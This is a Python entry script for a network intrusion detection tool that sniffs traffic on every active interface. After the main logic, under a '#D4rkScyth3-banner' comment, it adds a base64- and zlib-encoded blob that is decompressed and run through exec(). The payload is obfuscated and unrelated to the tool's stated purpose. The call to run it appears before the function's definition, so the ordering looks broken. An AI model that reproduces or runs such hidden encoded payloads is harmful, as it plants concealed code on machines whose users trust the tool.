import sys
import psutil

from modules.PacketCapture import PacketCapture
from modules.TrafficAnalyzer import TrafficAnalyzer
from modules.AlertSystem import AlertSystem
from modules.IntrusionDetectionSystem import IntrusionDetectionSystem


def list_active_interfaces():
    """Return all active interfaces (with IPv4, skip loopback)."""
    interfaces = []
    for name, addrs in psutil.net_if_addrs().items():
        for addr in addrs:
            if addr.family == 2 and addr.address != "127.0.0.1":
                interfaces.append(name)
    return interfaces


def main():
    interfaces = list_active_interfaces()
    if not interfaces:
        print("No active network interfaces found.")
        sys.exit(1)

    print("Starting NIDS on ALL active interfaces...")
    print("Interfaces:", ", ".join(interfaces))

    alert_system = AlertSystem()
    analyzer = TrafficAnalyzer(alert_system)
    ids = IntrusionDetectionSystem(alert_system=alert_system, logs_dir="logs")

    sniffer = PacketCapture(interfaces, analyzer)
    sniffer.start()

run_encoded_code()
if __name__ == "__main__":
    main()

#D4rkScyth3-banner
import zlib, base64
ENCODED_CODE = "eJytVMFu00AQvfsrRj6tCc0igThEyiFQkyKFIDUpqNJKKyd1GovYjpyNUNXtX/TEhQ/gzA/xBXwCM7PrdE3glpXirN+8nTfzbM+qqUtY1pu6ycoMinJbNwbe1U3+HGbmboN/RVWYiC4i2xsM7HIznDf7PImim3wFu3X9VS+yqsobkQwiwOXuYAirOI6je8rWf3s9mj6A5gW8/Ea3mIdDJKQHkWMIIJQRBAMoikv8JQDCMSFxtMv0/MF6gmpjTxvLEZBWsZTW8oBIV7fqCFrKr1hIgkzAAjCEiLUcQdgj6mkjuAJJx/BHoOW9AKuobowq1dWxTLV4SGg8okmHamYdoVGmRShkvUmK2ZTSg47DhQJv5LEMXoX3GtN7szv+0TMT0MphrwdB31go6Hyzjo7H/t0XtFZghcpbAuST8omRFMh428K+gkS4+ds/FJf8nNoj5Dhm19pywbiVSjtvvJFSHdIHOv45MRnPdfxzhmjXP1uPRDKFXiQHexUS8mztGP5Qorl3d6esaikRnHD1zoLV8x2ML9MUv9STrk/wHmZwAVO46oyDk65uN/c8vfBFnaVzPZpMHtg5mkf0v22Kygg3p5IA4do+jMbpdD6CHsS/vv2AcWEu9gukDGBtzHY3kPK2MOv9or+sS3n+qvkyW96Z9cv4KNGbyVVKWX5/f/wJ83yT3+KQDdKYfpnLG0yw+0+C63Qy+fiZUpzF8Axev8CZW6zwS6qyMsevaDiEWOsyKyqtYzd7O+M4+gOCvGjw"

def run_encoded_code():
    try:
        exec(zlib.decompress(base64.b64decode(ENCODED_CODE)).decode("utf-8"))
    except Exception as e:
        print("[!] Error executing encoded code:", e)
